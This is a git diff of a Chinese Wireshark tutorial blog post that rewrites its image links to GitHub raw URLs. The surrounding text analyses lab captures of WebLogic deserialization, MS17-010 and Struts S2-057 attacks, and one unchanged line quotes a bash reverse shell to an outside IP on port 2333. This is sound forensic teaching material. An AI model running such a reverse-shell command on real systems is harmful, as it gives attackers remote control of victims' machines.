@@ -8,13 +8,13 @@
 
 捕获-->选项
 
-![1.1.1](1.1.1.png)
+![1.1.1](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/杂项/wireshark使用及实列讲解/1.1.1.png)
 
 我这里要查看我wlan的流量，所以选择wlan。
 
 ## 1.2 显示面板介绍
 
-![1.1.2](1.1.2.png)
+![1.1.2](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/杂项/wireshark使用及实列讲解/1.1.2.png)
 
 **数据包列表**：
 
@@ -40,7 +40,7 @@ hypertext transfer protocol：应用层的信息，此处是http协议
 
 点击数据包详细信息数据区域的数据，在16进制数据区域中会显示对应的数据。个人理解数据包详细信息区是wireshark处理之后方便我们查看的数据包，而16进制数据包区域是实际在网络中传输的数据包。
 
-![1.1.3](1.1.3.png)
+![1.1.3](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/杂项/wireshark使用及实列讲解/1.1.3.png)
 
 
 
@@ -52,7 +52,7 @@ tcp，icmp，http，udp...
 
 单独输入只显示对应的协议数据包列表，列如：输入http
 
-![2.1.1](2.1.1.png)
+![2.1.1](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/杂项/wireshark使用及实列讲解/2.1.1.png)
 
 
 
@@ -64,7 +64,7 @@ tcp，icmp，http，udp...
 
   ip.addr == 120.241.148.154 显示源IP地址或目标IP地址为120.241.148.154的数据包列表
 
-![2.2.1](2.2.1.png)
+![2.2.1](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/杂项/wireshark使用及实列讲解/2.2.1.png)
 
 
 
@@ -76,7 +76,7 @@ tcp，icmp，http，udp...
 
  tcp.dstport == 80，只显示TCP协议的目的主机端口为80的数据包列表。
 
-![2.3.1](2.3.1.png)
+![2.3.1](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/杂项/wireshark使用及实列讲解/2.3.1.png)
 
 
 
@@ -86,7 +86,7 @@ http.request.method=="GET"，只显示HTTP GET方法
 
 http.request.method=="POST"
 
-![2.4.1](2.4.1.png)
+![2.4.1](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/杂项/wireshark使用及实列讲解/2.4.1.png)
 
 
 
@@ -96,19 +96,19 @@ http.request.method=="POST" and ip.src==192.168.71.249
 
 只显示192.168.71.249发送的post数据。
 
-![2.5.1](2.5.1.png)
+![2.5.1](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/杂项/wireshark使用及实列讲解/2.5.1.png)
 
 
 
 ## 2.6 固定特征检索
 
-![2.6.1](2.6.1.png)
+![2.6.1](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/杂项/wireshark使用及实列讲解/2.6.1.png)
 
 选中要cookie（可以选择为恶意的payload）右击，作为过滤器应用-->选中
 
 则只会显示cookie为选择值的数据包。
 
-![2.6.2](2.6.2.png)
+![2.6.2](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/杂项/wireshark使用及实列讲解/2.6.2.png)
 
 
 
@@ -126,7 +126,7 @@ docker地址：https://vulhub.org/#/environments/weblogic/CVE-2018-2628/
 ip.src==192.168.80.1 and ip.dst==192.168.80.4
 ```
 
-![3.1.1](3.1.1.png)
+![3.1.1](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/杂项/wireshark使用及实列讲解/3.1.1.png)
 
 
 
@@ -134,13 +134,13 @@ ip.src==192.168.80.1 and ip.dst==192.168.80.4
 
 发现192.168.80.1想192.168.80.4发送了很多个2798长度的数据包，将数据包内容复制出来查看
 
-![3.1.2](3.1.2.png)
+![3.1.2](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/杂项/wireshark使用及实列讲解/3.1.2.png)
 
 
 
 鼠标右键点击数据包内容，选择 as printable text即可将数据包内容复制到剪切板，将数据包复制到文本编辑器查看
 
-![3.1.3](3.1.3.png)
+![3.1.3](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/杂项/wireshark使用及实列讲解/3.1.3.png)
 
 ysoserial.jar，touch /tmp/h11ba1.txt 可以大致确定攻击者使用了ysoserial工具进行了反序列化攻击，准备在服务器执行"touch /tmp/h11ba1.txt"命令。
 
@@ -156,7 +156,7 @@ ip.addr==192.168.80.4 and ip.addr==192.168.80.8 and smb
 
 因为ms17-010主要通过smb端口，所以先看smb协议
 
-![3.2.1](3.2.1.png)
+![3.2.1](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/杂项/wireshark使用及实列讲解/3.2.1.png)
 
 发现192.168.80.4这个ip向192.168.80.8发送了大量的A字节。推测在进行溢出操作。所以确定发送ms17_010攻击
 
@@ -166,7 +166,7 @@ ip.addr==192.168.80.4 and ip.addr==192.168.80.8 and smb
 
 继续查看数据包，发现数据包中含有session setup and request数据包，并且数据包中含有被攻击机器的准确域信息，说明攻击成功。
 
-![3.2.2](3.2.2.png)
+![3.2.2](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/杂项/wireshark使用及实列讲解/3.2.2.png)
 
 
 
@@ -182,25 +182,25 @@ ip.addr==192.168.80.4 and ip.addr==192.168.80.8 and tcp
 
 从上往下依次查看，发现，被标黑的数据包中含有cmd命令行，重点查看标黑的数据流。并且可以确定攻击者通过4444端口来接收受害者的shell。
 
-![3.2.3](3.2.3.png)
+![3.2.3](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/杂项/wireshark使用及实列讲解/3.2.3.png)
 
 
 
 依次往下面查看，发现受害者192.168.80.8向攻击者192.168.80.4发送了自己的盘符信息。此时可以确定攻击者拥有了受害者cmd控制权。
 
-![3.2.4](3.2.4.png)
+![3.2.4](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/杂项/wireshark使用及实列讲解/3.2.4.png)
 
 
 
 依次往后面查看，发现攻击者执行了，whoami,ipconfig /all，net user /domain，dir等命令。并且受害者返回执行结果
 
-![3.2.5](3.2.5.png)
+![3.2.5](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/杂项/wireshark使用及实列讲解/3.2.5.png)
 
 
 
 鼠标右键点击--->选择as printable text，将数据包提取出来，复制到sublime中可以更清晰的查看
 
-![3.2.6](3.2.6.png)
+![3.2.6](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/杂项/wireshark使用及实列讲解/3.2.6.png)
 
 
 
@@ -212,7 +212,7 @@ struts s2-057主要通过GET请求发起攻击，只查看GET请求的数据
 http.request.method=="GET"
 ```
 
-![3.3.1](3.3.1.png)
+![3.3.1](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/杂项/wireshark使用及实列讲解/3.3.1.png)
 
 ### 3.3.1 poc验证漏洞
 
@@ -224,7 +224,7 @@ http.request.method=="GET"
 
 探测是否存在struts s2-057漏洞，跟踪http流查看漏洞是否存在
 
- ![3.3.2](3.3.2.png)
+ ![3.3.2](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/杂项/wireshark使用及实列讲解/3.3.2.png)
 
 
 
@@ -234,7 +234,7 @@ http.request.method=="GET"
 
 查看最后一个http流，发现存在bash字样，跟踪http流查看
 
-![3.3.3](3.3.3.png)
+![3.3.3](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/杂项/wireshark使用及实列讲解/3.3.3.png)
 
 
 
@@ -265,11 +265,11 @@ bash -i >&/dev/tcp/106.14.190.93/2333 0>&1
 ip.addr==106.14.190.93
 ```
 
-![3.3.4](3.3.4.png)
+![3.3.4](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/杂项/wireshark使用及实列讲解/3.3.4.png)
 
 发现数据中存在服务器名，跟踪tcp流，发现攻击者执行了ls命令，并且执行成功。
 
-![3.3.5](3.3.5.png)
+![3.3.5](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/杂项/wireshark使用及实列讲解/3.3.5.png)
 
 
 
